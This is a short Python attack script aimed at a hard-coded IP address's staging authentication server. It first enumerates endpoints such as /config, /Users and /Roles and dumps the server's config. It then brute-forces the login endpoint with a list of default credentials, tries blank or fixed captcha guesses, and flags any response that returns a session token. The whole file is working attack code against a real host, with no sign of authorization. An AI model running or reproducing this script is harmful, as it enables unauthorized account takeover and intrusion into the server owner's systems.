import requests, urllib3, json, itertools
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0"}
A="http://35.234.50.28:3400"

def fresh():
    s=requests.Session(); s.verify=False; return s

print("===== staging AuthServer :3400 basic =====")
s=fresh()
for p in ["/","/config","/js/publicConfig.js","/Users","/Roles","/Permissions","/login","/captcha","/login2FA","/refreshToken"]:
    try:
        r=s.get(A+p, timeout=10, headers=UA)
        print(f"  [{r.status_code}] GET {p} :: {r.headers.get('content-type','')[:20]} {r.text[:70]!r}")
    except Exception as e: print(f"  [ERR] {p} {e}")

print("\n===== staging :3400 /config full =====")
try:
    print(fresh().get(A+"/config", timeout=10).text[:800])
except Exception as e: print("err",e)

print("\n===== captcha behavior =====")
s=fresh()
r=s.get(A+"/captcha", timeout=10)
print(f"  /captcha -> {r.status_code} len={len(r.content)} cookies={dict(s.cookies)}")
print(f"  content-type={r.headers.get('content-type')!r}")

print("\n===== brute staging login with common creds (no captcha / with blank) =====")
creds=[("admin","admin"),("admin","password"),("admin","123456"),("admin","Admin123"),
 ("admin","admin123"),("user","user"),("test","test"),("root","root"),
 ("admin","Admin@123"),("admin","1"),("epcr","epcr"),("test@test.tw","test123"),
 ("admin","password123"),("admin","Admin@1234")]
for u,pw in creds:
    s=fresh()
    s.get(A+"/captcha", timeout=10)
    for cap in ["","12345","00000","11111"]:
        try:
            r=s.post(A+"/login", json={"username":u,"password":pw,"captcha":cap,"domain":"AUTH_SERVER"}, headers=UA, timeout=15)
            t=r.text
            if "token" in t and "refreshToken" in t:
                print(f"  *** LOGIN OK {u}/{pw} cap={cap!r} :: {t[:160]!r} ***")
            elif r.status_code==200 and "use2FA" in t:
                print(f"  >> 2FA path {u}/{pw} cap={cap!r} :: {t[:120]!r}")
            elif r.status_code not in (200,401) or "fail" not in t.lower():
                print(f"  [{r.status_code}] {u}/{pw} cap={cap!r} :: {t[:80]!r}")
        except Exception as e:
            print(f"  [ERR] {u}/{pw} {e}"); break
print("done")
